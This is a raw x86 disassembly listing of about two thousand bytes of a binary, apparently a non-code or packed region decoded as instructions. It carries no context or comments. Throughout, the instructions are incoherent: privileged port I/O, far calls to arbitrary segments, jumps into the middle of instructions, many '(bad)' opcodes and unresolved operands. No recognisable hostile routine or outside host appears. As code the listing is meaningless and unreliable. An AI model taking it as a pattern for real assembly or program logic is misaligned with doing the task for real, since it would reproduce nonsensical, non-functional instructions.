  4323cd:	inc    esp
  4323ce:	iret   
  4323cf:	sbb    DWORD PTR [esi+0x9],ebx
  4323d2:	in     al,dx
  4323d3:	cmp    BYTE PTR [edi-0x763945af],ch
  4323d9:	push   edx
  4323da:	jns    0x4323b7
  4323dc:	push   cs
  4323dd:	lods   al,BYTE PTR ds:[esi]
  4323de:	dec    esi
  4323df:	cmp    BYTE PTR [edx+0x60fc7c4a],bl
  4323e5:	aam    0x35
  4323e7:	jno    0x43244f
  4323e9:	adc    al,0x68
  4323eb:	and    DWORD PTR [ebx-0x31d10004],esp
  4323f1:	retf   
  4323f2:	ds in  eax,0x5e
  4323f5:	in     eax,dx
  4323f6:	mov    DWORD PTR [edi-0x56fbf53c],esp
  4323fc:	ins    BYTE PTR es:[edi],dx
  4323fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4323fe:	(bad)  
  4323ff:	lods   eax,DWORD PTR ds:[esi]
  432400:	push   esi
  432401:	lds    ebp,FWORD PTR [esi-0x6e]
  432404:	jg     0x4323de
  432406:	cld    
  432407:	cmp    DWORD PTR [edi+edx*2-0xdc1cb15],eax
  43240e:	icebp  
  43240f:	ret    0x8962
  432412:	xor    cl,BYTE PTR [edi]
  432414:	shl    BYTE PTR [eax-0x5f],0xb4
  432418:	fistp  DWORD PTR [edx+0x6a]
  43241b:	ins    DWORD PTR es:[edi],dx
  43241c:	cmp    edi,ecx
  43241e:	jmp    0xb23f6043
  432423:	popa   
  432424:	sahf   
  432425:	mov    ebp,0x60888537
  43242a:	scas   eax,DWORD PTR es:[edi]
  43242b:	in     eax,dx
  43242c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43242d:	int    0x92
  43242f:	ja     0x4323d2
  432431:	call   0xeab2:0xe68985c
  432438:	inc    esi
  432439:	mov    eax,0x925d0ee
  43243e:	add    DWORD PTR [ecx],ecx
  432440:	lea    ebp,[esp+edi*1]
  432443:	mov    eax,ds:0x7c96eba3
  432448:	lahf   
  432449:	jmp    0xf538f41a
  43244e:	out    dx,al
  43244f:	push   edi
  432450:	std    
  432451:	(bad)  
  432452:	push   edx
  432453:	xchg   BYTE PTR [edx+0xd],ah
  432456:	ror    BYTE PTR [esi-0x5189a77c],1
  43245c:	ficom  WORD PTR [edx-0xb75b89b]
  432462:	adc    BYTE PTR [ebx],bl
  432464:	pop    esi
  432465:	pop    edx
  432466:	clc    
  432467:	xor    al,0x73
  432469:	mov    BYTE PTR [ecx],ch
  43246b:	cmc    
  43246c:	fldenv [eax+0x1e]
  43246f:	hlt    
  432470:	dec    eax
  432471:	inc    ecx
  432472:	bound  edx,QWORD PTR [ecx]
  432474:	pop    esp
  432475:	xor    al,0xee
  432477:	or     esp,ebp
  432479:	fisub  DWORD PTR [esi-0x2de78b4d]
  43247f:	jo     0x4324ac
  432481:	retf   0xd3e6
  432484:	pop    esi
  432485:	scas   eax,DWORD PTR es:[edi]
  432486:	cmp    edx,ecx
  432488:	mov    esp,0x85cfe2e7
  43248d:	pusha  
  43248e:	ds xor eax,0x3afed37a
  432494:	mov    WORD PTR [ebx-0x34e53a10],es
  43249a:	aas    
  43249b:	dec    eax
  43249c:	mov    eax,ds:0x6dfa3776
  4324a1:	enter  0xe944,0xa2
  4324a5:	jmp    0x26d5c5a7
  4324aa:	add    ch,BYTE PTR [ebx]
  4324ac:	cld    
  4324ad:	mov    bh,0x9e
  4324af:	pop    ss
  4324b0:	pop    esi
  4324b1:	cs hlt 
  4324b3:	ficomp WORD PTR [edx]
  4324b5:	test   BYTE PTR [ebx+ebp*2+0x7f],0xb4
  4324ba:	mov    ah,0xa0
  4324bc:	xchg   esi,eax
  4324bd:	jae    0x43246e
  4324bf:	outs   dx,DWORD PTR ds:[esi]
  4324c0:	add    BYTE PTR [eax-0x6c],ch
  4324c3:	push   ds
  4324c4:	mov    ds:0x2419c14,eax
  4324c9:	leave  
  4324ca:	jg     0x4324db
  4324cc:	adc    al,0x61
  4324ce:	jo     0x432533
  4324d0:	shl    DWORD PTR [ebp-0x18],0x49
  4324d4:	std    
  4324d5:	add    edi,esp
  4324d7:	push   eax
  4324d8:	fnstcw WORD PTR [ebx+eax*4-0x39d07120]
  4324df:	xor    bh,cl
  4324e1:	fs jae 0x432549
  4324e4:	pop    esi
  4324e5:	jecxz  0x4324a4
  4324e7:	mov    al,0xb
  4324e9:	mov    ebx,0xd269513
  4324ee:	sub    esp,DWORD PTR [ecx+0x47526432]
  4324f4:	out    dx,al
  4324f5:	sbb    DWORD PTR [ecx+0x55cfe0a1],ecx
  4324fb:	pop    edx
  4324fc:	add    eax,0xf4759cd7
  432501:	mov    bl,0xec
  432503:	pop    eax
  432504:	fnstcw WORD PTR [edx+0x54]
  432507:	add    esp,eax
  432509:	shl    BYTE PTR [esi-0x249f8d5e],0x98
  432510:	jg     0x432533
  432512:	xor    al,0x6a
  432514:	out    dx,al
  432515:	adc    DWORD PTR [edx+eiz*8-0x40],ebx
  432519:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43251a:	scas   al,BYTE PTR es:[edi]
  43251b:	clc    
  43251c:	outs   dx,BYTE PTR ds:[esi]
  43251d:	and    DWORD PTR [eax],0xf52b1809
  432523:	lods   eax,DWORD PTR ds:[esi]
  432524:	or     eax,0xc4a19e75
  432529:	out    0x3a,al
  43252b:	jle    0x432504
  43252d:	jns    0x4324d6
  43252f:	and    eax,0x48ee2a12
  432534:	jne    0x43250c
  432536:	dec    edi
  432537:	jmp    0xb1d85c3
  43253c:	jbe    0x43254a
  43253e:	adc    eax,0xda04b48c
  432543:	add    al,bh
  432545:	xor    ebp,esi
  432547:	xchg   ebp,eax
  432548:	sbb    eax,0xf33a7adc
  43254d:	cmp    al,BYTE PTR [esi-0x1f6d8b5f]
  432553:	aad    0xe2
  432555:	inc    edx
  432556:	pop    ebx
  432557:	mov    ebx,0xa19a5937
  43255c:	push   cs
  43255d:	xor    eax,ebx
  43255f:	cdq    
  432560:	push   esi
  432561:	dec    esp
  432562:	ins    BYTE PTR es:[edi],dx
  432563:	mov    eax,ds:0xd334a4d
  432568:	inc    ebp
  432569:	dec    eax
  43256a:	loopne 0x4324ee
  43256c:	pop    esi
  43256d:	pusha  
  43256e:	(bad)  
  43256f:	xchg   esi,eax
  432570:	cld    
  432571:	mov    al,0xa6
  432573:	or     BYTE PTR ds:0x9967a561,ch
  432579:	sub    esi,DWORD PTR [ecx-0x109cc1f1]
  43257f:	std    
  432580:	push   edx
  432581:	adc    ch,0xe0
  432584:	jecxz  0x43250f
  432586:	mov    al,0x30
  432588:	ja     0x4325ea
  43258a:	mov    eax,0x336da4c6
  43258f:	mov    BYTE PTR [edx],dh
  432591:	pop    eax
  432592:	out    dx,al
  432593:	and    BYTE PTR [edi+0x6f],bh
  432596:	xchg   BYTE PTR [eax],bl
  432598:	sahf   
  432599:	add    al,0xbd
  43259b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43259c:	jge    0x4325a1
  43259e:	das    
  43259f:	mov    dh,0x7
  4325a1:	mov    eax,ds:0x879e7c3
  4325a6:	out    dx,al
  4325a7:	in     al,0x71
  4325a9:	cmp    DWORD PTR [edi+0xc],esp
  4325ac:	js     0x432598
  4325ae:	clc    
  4325af:	mov    ds:0xaaed4002,eax
  4325b4:	out    dx,eax
  4325b5:	xor    edi,DWORD PTR [ebp+0x60]
  4325b8:	lock jne 0x432629
  4325bb:	cwde   
  4325bc:	fld    TBYTE PTR [edx-0x450d721a]
  4325c2:	mov    ecx,0x7eff8520
  4325c7:	test   BYTE PTR [eax+0x70],bh
  4325ca:	add    DWORD PTR [ebx+0x372f2e18],edx
  4325d0:	pop    ss
  4325d1:	popa   
  4325d2:	xchg   edx,eax
  4325d3:	xchg   al,bl
  4325d5:	or     esi,DWORD PTR [ebp-0x2dac6a60]
  4325db:	test   eax,0x5876a463
  4325e0:	pop    esi
  4325e1:	fisttp WORD PTR [edi-0x24]
  4325e4:	ss pop es
  4325e6:	inc    esp
  4325e7:	retf   0x607f
  4325ea:	push   0x48
  4325ec:	mov    WORD PTR [ebp*8-0x11199712],cs
  4325f3:	das    
  4325f4:	inc    edi
  4325f5:	push   ebp
  4325f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4325f7:	test   eax,0xa105df69
  4325fc:	push   es
  4325fd:	lahf   
  4325fe:	loope  0x432581
  432600:	pop    ebp
  432601:	sub    DWORD PTR [eax-0x6a],edx
  432604:	push   esp
  432605:	je     0x43266d
  432607:	inc    ecx
  432608:	ret    0xee18
  43260b:	std    
  43260c:	cmp    BYTE PTR [eax],bh
  43260e:	iret   
  43260f:	mov    DWORD PTR [edi+0x14a899f0],edx
  432615:	fisubr WORD PTR [ebp-0x6d51a60b]
  43261b:	das    
  43261c:	mov    ds,WORD PTR [edx]
  43261e:	xor    ebx,DWORD PTR [ebx+esi*8-0x37ef7186]
  432625:	dec    ebp
  432626:	fidiv  DWORD PTR [ebx+eiz*2+0x42]
  43262a:	es dec esi
  43262c:	or     DWORD PTR [ecx+0x6a8266d8],esp
  432632:	ret    
  432633:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432634:	fst    DWORD PTR [edx]
  432636:	rcl    DWORD PTR [esi],cl
  432638:	or     al,0x51
  43263a:	push   eax
  43263b:	pop    ds
  43263c:	cmp    cl,bl
  43263e:	and    al,0x98
  432640:	cmp    al,0xe1
  432642:	cmp    eax,0xd82c2673
  432647:	adc    BYTE PTR [ebx-0x35a62aa7],cl
  43264d:	popa   
  43264e:	icebp  
  43264f:	jo     0x4326b5
  432651:	sub    eax,0xab529381
  432656:	cwde   
  432657:	or     bl,dh
  432659:	(bad)  
  43265a:	pop    edi
  43265b:	dec    edi
  43265c:	outs   dx,BYTE PTR ds:[esi]
  43265d:	push   0xffffffbe
  43265f:	mov    al,ds:0x8689f009
  432664:	ret    0xcd17
  432667:	and    ebx,DWORD PTR [esi-0x78]
  43266a:	mov    ah,0xe5
  43266c:	cmp    DWORD PTR [esi+0x1a],0x4260c68b
  432673:	mov    bl,ch
  432675:	and    BYTE PTR [eax+edx*8-0x6c],dl
  432679:	repz out dx,eax
  43267b:	fsubp  st(3),st
  43267d:	cwde   
  43267e:	pop    edx
  43267f:	inc    ecx
  432680:	pop    esp
  432681:	lock pop ebx
  432683:	dec    esp
  432684:	cmp    ah,BYTE PTR [eax-0x10]
  432687:	aas    
  432688:	je     0x43268c
  43268a:	push   edx
  43268b:	jmp    0x4326ca
  43268d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43268e:	push   ds
  43268f:	xor    al,0x5e
  432691:	xor    DWORD PTR [ecx-0x54],esp
  432694:	lock (bad) [ecx]
  432697:	dec    esp
  432698:	icebp  
  432699:	push   ecx
  43269a:	out    0x12,al
  43269c:	jle    0x4326dc
  43269e:	cs pop es
  4326a0:	iret   
  4326a1:	jmp    0x4326af
  4326a3:	cmp    al,0x5e
  4326a5:	dec    eax
  4326a6:	mov    esp,0x90818d6e
  4326ab:	pushf  
  4326ac:	and    BYTE PTR [ecx+0x59],ah
  4326af:	out    0xbe,eax
  4326b1:	(bad)  
  4326b2:	int3   
  4326b3:	inc    esp
  4326b4:	adc    esi,DWORD PTR [ebx+edi*8]
  4326b7:	jae    0x43270c
  4326b9:	(bad)  
  4326bb:	xchg   esi,eax
  4326bc:	das    
  4326bd:	imul   esi,DWORD PTR [ebx-0x2d],0x31
  4326c1:	popa   
  4326c2:	leave  
  4326c3:	jbe    0x432724
  4326c5:	sti    
  4326c6:	cmc    
  4326c7:	sahf   
  4326c8:	out    0xc3,al
  4326ca:	out    dx,al
  4326cb:	jb     0x43265a
  4326cd:	loopne 0x432674
  4326cf:	loop   0x43270e
  4326d1:	in     al,dx
  4326d2:	add    BYTE PTR [ebx+0x2b0460f3],0xbc
  4326d9:	xor    eax,0x9a5621d0
  4326de:	out    dx,al
  4326df:	fld    TBYTE PTR [edi]
  4326e1:	aaa    
  4326e2:	call   0x75a1:0xb23b2a02
  4326e9:	xchg   eax,ebp
  4326eb:	js     0x43269e
  4326ed:	dec    ecx
  4326ee:	ins    BYTE PTR es:[edi],dx
  4326ef:	and    edx,0x5577eec7
  4326f5:	imul   esi,DWORD PTR [ebp+0x691cf36e],0xffffff8e
  4326fc:	adc    al,0x7a
  4326fe:	pop    esp
  4326ff:	lods   al,BYTE PTR ds:[esi]
  432700:	pop    esi
  432701:	adc    eax,0xe681aeb
  432706:	addr16 pop ds
  432708:	pop    esi
  432709:	mov    edx,0xc277c1c3
  43270e:	adc    al,0xb0
  432710:	add    eax,0x9452b661
  432715:	out    0xd1,eax
  432717:	mov    DWORD PTR [bx-0xe13],esp
  43271c:	xor    dh,ah
  43271e:	dec    edi
  43271f:	inc    esp
  432720:	sbb    dh,BYTE PTR [ebx+0x59b81fae]
  432726:	xchg   esp,eax
  432727:	lahf   
  432728:	sbb    BYTE PTR [ecx-0x6d],cl
  43272b:	pop    es
  43272c:	and    al,0xd1
  43272e:	dec    esi
  43272f:	outs   dx,DWORD PTR ds:[esi]
  432730:	sbb    BYTE PTR [ebp+0x0],0xb2
  432734:	pop    esi
  432735:	mov    DWORD PTR [ecx+0x49b2c1d3],ebx
  43273b:	adc    eax,0x717060e8
  432740:	aam    0x7d
  432742:	jne    0x43275a
  432744:	xor    DWORD PTR [ecx+0xa4e34eb],edi
  43274a:	in     eax,0xff
  43274c:	out    0xd9,eax
  43274e:	scas   al,BYTE PTR es:[edi]
  43274f:	fcmovnu st,st(3)
  432751:	popa   
  432752:	hlt    
  432753:	push   0x6e
  432755:	pusha  
  432756:	ror    BYTE PTR [ebp+0x5f],1
  432759:	fidivr WORD PTR gs:[edx+0x18]
  43275d:	and    edx,DWORD PTR [eax]
  43275f:	cmp    eax,esi
  432761:	loope  0x432763
  432763:	pop    esp
  432764:	sahf   
  432765:	rol    BYTE PTR [edi],0xbf
  432768:	jmp    0x4327da
  43276a:	and    BYTE PTR [ecx+0x2693587c],ah
  432770:	dec    BYTE PTR [ecx+0x5d]
  432773:	sbb    eax,0x5eb7b6e
  432778:	imul   esp,DWORD PTR [edx],0xffffff9d
  43277b:	push   ecx
  43277c:	mov    ch,BYTE PTR [eax+0x4ec3d575]
  432782:	test   eax,0x94611608
  432787:	bound  edx,QWORD PTR [ecx+0x5ef772f8]
  43278d:	les    edx,FWORD PTR [edi-0x516ac64a]
  432793:	div    DWORD PTR [ebx+0x60]
  432796:	or     bh,BYTE PTR [ebp-0x7b390533]
  43279c:	lock fsubp st(6),st
  43279f:	mov    BYTE PTR [edi-0x1562607c],cl
  4327a5:	call   0xdc7dc888
  4327aa:	test   al,0xbf
  4327ac:	les    esp,FWORD PTR [edx+0x22]
  4327af:	cmp    DWORD PTR [esi-0x1d],ebx
  4327b2:	sub    dl,BYTE PTR [edx+0x45]
  4327b5:	and    edi,ebp
  4327b7:	add    esp,esi
  4327b9:	pusha  
  4327ba:	sahf   
  4327bb:	mov    cl,0x1c
  4327bd:	bound  ecx,QWORD PTR ds:0xeeaa1d47
  4327c3:	or     ebx,eax
  4327c5:	dec    esp
  4327c6:	inc    ebx
  4327c7:	inc    ebx
  4327c8:	ins    DWORD PTR es:[edi],dx
  4327c9:	mov    ebx,0x5d67ae2f
  4327ce:	pop    edi
  4327cf:	mov    eax,ds:0x4035f54f
  4327d4:	mov    al,0xf6
  4327d6:	std    
  4327d7:	inc    ecx
  4327d8:	pusha  
  4327d9:	inc    ecx
  4327da:	clc    
  4327db:	jne    0x4327a1
  4327dd:	add    eax,0x58948165
  4327e2:	xchg   ebp,eax
  4327e3:	mov    eax,ds:0x785f48ba
  4327e8:	popf   
  4327e9:	rdpmc  
  4327eb:	iret   
  4327ec:	pop    esi
  4327ed:	pusha  
  4327ee:	shr    al,1
  4327f0:	js     0x432817
  4327f2:	cmp    BYTE PTR [ecx+0x6715e20],0xba
  4327f9:	mov    dh,0x95
  4327fb:	sbb    BYTE PTR [esi+0x5ebc6681],0xc6
  432802:	sbb    esp,esi
  432804:	fwait
  432805:	bound  ebp,QWORD PTR [eax+0x562a6ba3]
  43280b:	stos   DWORD PTR es:[edi],eax
  43280c:	mov    BYTE PTR [edx-0x12],dh
  43280f:	inc    ebx
  432810:	mov    bh,0x97
  432812:	scas   eax,DWORD PTR es:[edi]
  432813:	push   eax
  432814:	daa    
  432815:	xchg   edx,eax
  432816:	fstp   QWORD PTR [esi+0x5e]
  432819:	mov    BYTE PTR [esi+0x52248340],cl
  43281f:	push   0x45
  432821:	addr16 jno 0x4327ea
  432824:	faddp  st(2),st
  432826:	xchg   ebp,eax
  432827:	inc    ebx
  432828:	mov    ebp,0x5eadfef9
  43282d:	jbe    0x432851
  43282f:	ins    DWORD PTR es:[edi],dx
  432830:	pop    eax
  432831:	enter  0x79a4,0xf3
  432835:	mov    ah,0xfa
  432837:	cmp    BYTE PTR [eax+eiz*2+0x25421866],0xb
  43283f:	push   edi
  432840:	btc    esi,ebp
  432843:	outs   dx,BYTE PTR ds:[esi]
  432844:	lods   eax,DWORD PTR ds:[esi]
  432845:	aaa    
  432846:	cmp    BYTE PTR [edx],0x90
  432849:	adc    esp,DWORD PTR fs:[ecx+0x7be3d39e]
  432850:	mov    esp,0xf1f5eb85
  432855:	xchg   esi,eax
  432856:	add    bh,BYTE PTR [ebp+0x24]
  432859:	xor    ebp,DWORD PTR [esi-0x34]
  43285c:	mov    edi,0x6dffbb17
  432861:	pop    ecx
  432862:	push   eax
  432863:	in     al,dx
  432864:	add    BYTE PTR ds:0xea8310f0,bl
  43286a:	mov    ds:0x5a20eb64,al
  43286f:	cmc    
  432870:	pop    esi
  432871:	stos   DWORD PTR es:[edi],eax
  432872:	push   ebp
  432873:	cmp    bh,BYTE PTR ds:0xa8681c49
  432879:	pusha  
  43287a:	sbb    bh,BYTE PTR [edi-0x8614707]
  432880:	repnz pop esi
  432882:	out    dx,al
  432883:	repnz into 
  432885:	jbe    0x4328f6
  432887:	jae    0x432868
  432889:	jnp    0x43284d
  43288b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43288c:	mov    ds:0xf3f1d432,al
  432891:	loopne 0x43287a
  432893:	dec    edx
  432894:	outs   dx,BYTE PTR ds:[esi]
  432895:	and    dh,ch
  432897:	sar    ebx,0x12
  43289a:	push   es
  43289b:	push   ds
  43289c:	cmc    
  43289d:	adc    al,0xf5
  43289f:	mov    al,ds:0xee31019d
  4328a4:	fsubr  QWORD PTR [ebp-0xd]
  4328a7:	jmp    0x4328e1
  4328a9:	mov    ds:0xa8cba100,eax
  4328ae:	jl     0x43287b
  4328b0:	sub    cl,al
  4328b2:	pop    ebx
  4328b3:	mov    eax,ds:0xb3dcf0e9
  4328b8:	dec    esi
  4328b9:	scas   eax,DWORD PTR es:[edi]
  4328ba:	jmp    0x9b54:0xc8b25e8f
  4328c1:	cmc    
  4328c2:	fwait
  4328c3:	mov    esi,0x38386087
  4328c8:	sub    al,0xc2
  4328ca:	sbb    eax,0xee3764c0
  4328cf:	scas   eax,DWORD PTR es:[edi]
  4328d0:	mov    ch,0xe5
  4328d2:	js     0x432856
  4328d4:	cmp    al,0xc5
  4328d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4328d7:	test   eax,0x226e99ae
  4328dc:	ret    
  4328dd:	repz inc ebp
  4328df:	mul    DWORD PTR [ebx+0x63]
  4328e2:	mov    dh,0xb
  4328e4:	les    eax,FWORD PTR [ecx+0x2e]
  4328e7:	mov    esp,0x2a5c1ade
  4328ec:	clc    
  4328ed:	adc    BYTE PTR [ebx-0x63],dl
  4328f0:	sub    eax,DWORD PTR [eax-0x277b3b94]
  4328f6:	out    dx,al
  4328f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4328f8:	gs js  0x43292c
  4328fb:	test   dh,bh
  4328fd:	sbb    DWORD PTR [eax-0x56f95760],ebp
  432903:	cmp    al,0x4a
  432905:	or     dh,BYTE PTR ds:0x161e5e13
  43290b:	push   0x35ae7c08
  432910:	pop    edx
  432911:	popa   
  432912:	jne    0x4328c5
  432914:	sub    BYTE PTR [edx-0x47],bh
  432917:	aas    
  432918:	jle    0x432999
  43291a:	push   ss
  43291b:	mov    WORD PTR es:[eax-0x359a2911],ss
  432922:	xor    DWORD PTR [ecx-0x26],eax
  432925:	(bad)  
  432926:	out    0xdb,eax
  432928:	push   cs
  432929:	pop    esi
  43292a:	mov    bh,0xee
  43292c:	dec    eax
  43292d:	hlt    
  43292e:	shl    DWORD PTR [edi-0x42],0xe5
  432932:	cwde   
  432933:	inc    esp
  432934:	pop    esi
  432935:	fnsetpm(287 only) 
  432937:	cmp    BYTE PTR [ebp-0x1a0126ea],al
  43293d:	pop    ebp
  43293e:	call   0xc63f:0x69e49a25
  432945:	push   si
  432947:	fstp   QWORD PTR [esi-0x19]
  43294a:	fwait
  43294b:	inc    esi
  43294c:	cmp    DWORD PTR [ecx+0x2c0cd264],esp
  432952:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432953:	test   al,0x1c
  432955:	dec    eax
  432956:	or     BYTE PTR [edi+eax*2-0x7f],0xfe
  43295b:	cdq    
  43295c:	adc    DWORD PTR [edi+0x157e03ee],ebx
  432962:	jecxz  0x43297b
  432964:	push   esi
  432965:	jns    0x43290b
  432967:	mov    eax,ds:0x95d67c01
  43296c:	ja     0x4328f6
  43296e:	push   edx
  43296f:	vmovhps xmm4,xmm1,QWORD PTR [eax]
  432973:	in     eax,dx
  432974:	scas   al,BYTE PTR es:[edi]
  432975:	lock mov dh,0xbe
  432978:	in     al,0xa3
  43297a:	adc    DWORD PTR [eax+0x20abbee2],0xbe60e637
  432984:	or     eax,0x2df2e735
  432989:	arpl   WORD PTR ds:0xfeb3abd1,si
  43298f:	jb     0x43297c
  432991:	lods   eax,DWORD PTR ds:[esi]
  432992:	ds jns 0x4329dc
  432995:	pop    edx
  432996:	xor    cl,BYTE PTR [edi+0x31027cb5]
  43299c:	int3   
  43299d:	aad    0xa0
  43299f:	mov    ds,WORD PTR [esi-0x20]
  4329a2:	les    esi,FWORD PTR [eax-0x56fa9887]
  4329a8:	push   0x14
  4329aa:	jecxz  0x432949
  4329ac:	pop    ebx
  4329ad:	repnz (bad) 
  4329af:	push   ds
  4329b0:	test   eax,0x85ddc510
  4329b5:	inc    edx
  4329b6:	out    0x57,eax
  4329b8:	mov    ds:0xdefa2602,eax
  4329bd:	das    
  4329be:	xor    eax,0x5f64ef89
  4329c3:	push   ds
  4329c4:	mov    edx,0x84a487eb
  4329c9:	jge    0x432972
  4329cb:	add    al,0x9e
  4329cd:	xor    bh,dh
  4329cf:	pop    esi
  4329d0:	pop    edi
  4329d1:	ret    
  4329d2:	push   es
  4329d3:	gs cmc 
  4329d5:	push   esp
  4329d6:	pop    ds
  4329d7:	and    eax,0xc484989e
  4329dc:	cmp    al,0x11
  4329de:	dec    edi
  4329df:	and    al,0x7a
  4329e1:	pusha  
  4329e2:	push   ebx
  4329e3:	adc    edx,DWORD PTR ds:0x5709382f
  4329e9:	and    dh,ch
  4329eb:	jne    0x4329f1
  4329ed:	lock xchg ebx,eax
  4329ef:	add    esi,DWORD PTR [edi-0x3f5ee05d]
  4329f5:	bnd jmp 0x432a5f
  4329f8:	lock imul edi,DWORD PTR [edi-0x37],0xa1c75d5d
  432a00:	xchg   edi,eax
  432a01:	imul   esi,DWORD PTR [esi-0x5fc76909],0xffffffa1
  432a08:	int3   
  432a09:	push   esi
  432a0a:	dec    bh
  432a0c:	jle    0x4329e9
  432a0e:	jne    0x4329b9
  432a10:	pop    esi
  432a11:	mov    ?,WORD PTR fs:[esi]
  432a14:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  432a16:	out    0x60,al
  432a18:	xchg   DWORD PTR [eax-0x43],esp
  432a1b:	imul   edx,DWORD PTR [edi-0x45],0xffffff9a
  432a1f:	out    0x11,eax
  432a21:	push   edi
  432a22:	out    dx,al
  432a23:	pop    ds
  432a24:	mov    edi,edi
  432a26:	mov    bl,0x97
  432a28:	ss inc esp
  432a2a:	repz mov al,ds:0x4005c1e6
  432a30:	std    
  432a31:	(bad)  
  432a32:	adc    BYTE PTR [esi+0x716f9f5e],dl
  432a38:	add    DWORD PTR [edx+0x60be9d42],ecx
  432a3e:	(bad)  
  432a3f:	pop    edx
  432a40:	scas   al,BYTE PTR es:[edi]
  432a41:	adc    DWORD PTR [ecx],0x52acd072
  432a47:	in     al,0x5d
  432a49:	out    0x70,eax
  432a4b:	inc    ebx
  432a4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432a4d:	add    ebp,DWORD PTR [esi]
  432a4f:	jp     0x4329f3
  432a51:	aas    
  432a52:	sub    ebp,ebp
  432a54:	out    0x59,al
  432a56:	out    dx,eax
  432a57:	imul   esi,DWORD PTR [ecx],0x5ae1a263
  432a5d:	repnz (bad) 
  432a5f:	sar    BYTE PTR [esi+0x58],cl
  432a62:	or     al,BYTE PTR [ebx-0x6411e297]
  432a68:	sbb    eax,0xd101c8de
  432a6d:	pop    edi
  432a6e:	clc    
  432a6f:	(bad)
  432a72:	aas    
  432a73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432a74:	jmp    0x6a7925a9
  432a79:	fldz   
  432a7b:	cmp    edx,DWORD PTR [esi]
  432a7d:	sti    
  432a7e:	aaa    
  432a7f:	add    eax,0x908b1f2a
  432a84:	cmp    dl,BYTE PTR gs:[esi+0x24]
  432a88:	mov    ecx,0xcdd6a0cd
  432a8d:	mov    esp,0xfe856d10
  432a92:	pop    esp
  432a93:	imul   ecx,DWORD PTR [ebx+0x28],0xa546fb0
  432a9a:	lods   al,BYTE PTR cs:[esi]
  432a9c:	adc    DWORD PTR [esi+0x60fc8fd9],ecx
  432aa2:	sbb    BYTE PTR [ebp-0x1ca96be],0xbb
  432aa9:	mov    ah,0x5c
  432aab:	cld    
  432aac:	jmp    0x432ac7
  432aae:	out    dx,al
  432aaf:	div    BYTE PTR [ecx-0x51b460db]
  432ab5:	mov    ds:0x615b7f40,eax
  432aba:	jmp    0x4ceb4f67
  432abf:	xchg   ebx,eax
  432ac0:	ret    0xee4a
  432ac3:	jge    0x432b17
  432ac5:	(bad)  
  432ac6:	fisttp DWORD PTR [edi-0x4b]
  432ac9:	xchg   ecx,eax
  432aca:	jg     0x432a5a
  432acc:	in     al,0xfc
  432ace:	and    eax,0xdd0a5e6e
  432ad3:	mov    bl,0x84
  432ad5:	push   0xffffffc5
  432ad7:	arpl   WORD PTR ss:0xa0ea0f20,dx
  432ade:	push   edi
  432adf:	xor    ebx,DWORD PTR [ecx-0xc]
  432ae2:	mov    dh,0x8c
  432ae4:	mov    ebp,0x5de86968
  432ae9:	retf   0x30fd
  432aec:	in     al,0x26
  432aee:	dec    esp
  432aef:	mov    ebp,0x561a525e
  432af4:	jnp    0x432b48
  432af6:	push   cs
  432af7:	das    
  432af8:	nop
  432af9:	pop    ecx
  432afa:	dec    esi
  432afb:	aas    
  432afc:	add    eax,0x68b430c4
  432b01:	outs   dx,BYTE PTR ds:[esi]
  432b02:	jnp    0x432a90
  432b04:	mov    ?,WORD PTR [esi+eax*2-0xb]
  432b08:	pop    esi
  432b09:	scas   eax,DWORD PTR es:[edi]
  432b0a:	outs   dx,BYTE PTR ds:[esi]
  432b0b:	xor    ah,BYTE PTR [eax]
  432b0d:	xchg   ebp,eax
  432b0e:	shl    DWORD PTR [eax-0x78],cl
  432b11:	pusha  
  432b12:	adc    cl,BYTE PTR [esp+esi*4-0x15]
  432b16:	mov    esi,0xee61bde8
  432b1b:	pushf  
  432b1c:	push   edx
  432b1d:	jo     0x432b8d
  432b1f:	mov    al,ds:0xa1888fac
  432b24:	or     edi,DWORD PTR [edx]
  432b26:	push   0x56
  432b28:	sub    ebx,DWORD PTR [esi]
  432b2a:	cmc    
  432b2b:	sub    esi,ebp
  432b2d:	sbb    al,0xef
  432b2f:	sar    esi,1
  432b31:	jnp    0x432abe
  432b33:	sub    BYTE PTR [ebx+ebx*2-0x52],cl
  432b37:	add    al,0x6d
  432b39:	cmp    ah,BYTE PTR ds:[ecx+0x27f23875]
  432b40:	jno    0x432ae1
  432b42:	sahf   
  432b43:	mov    BYTE PTR [eax+0x46],ah
  432b46:	daa    
  432b47:	jmp    0x6156ca69
  432b4c:	xor    dh,BYTE PTR [esi+0x6e69a19b]
  432b52:	dec    eax
  432b53:	mov    eax,0x35043ba7
  432b58:	pop    esi
  432b59:	repz xchg ecx,eax
  432b5b:	cli    
  432b5c:	sbb    ch,BYTE PTR ss:[ecx-0x35]
  432b60:	or     al,0x61
  432b62:	mov    edi,0x2f4b63df
  432b67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432b68:	js     0x432b8d
  432b6a:	adc    BYTE PTR [esi],dl
  432b6c:	stc    
  432b6d:	mov    ah,0xed
  432b6f:	mov    ah,bh
  432b71:	push   edx
  432b72:	mov    bl,0xea
  432b74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432b75:	xor    BYTE PTR [edx-0x7558935f],bl
  432b7b:	push   ds
  432b7c:	jae    0x432bfb
  432b7e:	dec    ecx
  432b7f:	or     BYTE PTR [edx+0x0],ch
  432b82:	ficom  DWORD PTR [ecx+0x7a]
  432b85:	push   eax
  432b86:	out    dx,al
  432b87:	sbb    DWORD PTR [eax+0x6],eax
  432b8a:	push   ebp
  432b8b:	dec    edi
  432b8c:	out    0x1c,al
  432b8e:	inc    ecx
  432b8f:	mov    eax,ds:0xd6b9e601
  432b94:	xor    DWORD PTR [edi+0x1f],ebx
  432b97:	dec    eax
  432b98:	pop    esi
  432b99:	shr    ch,1
  432b9b:	xor    dh,dh
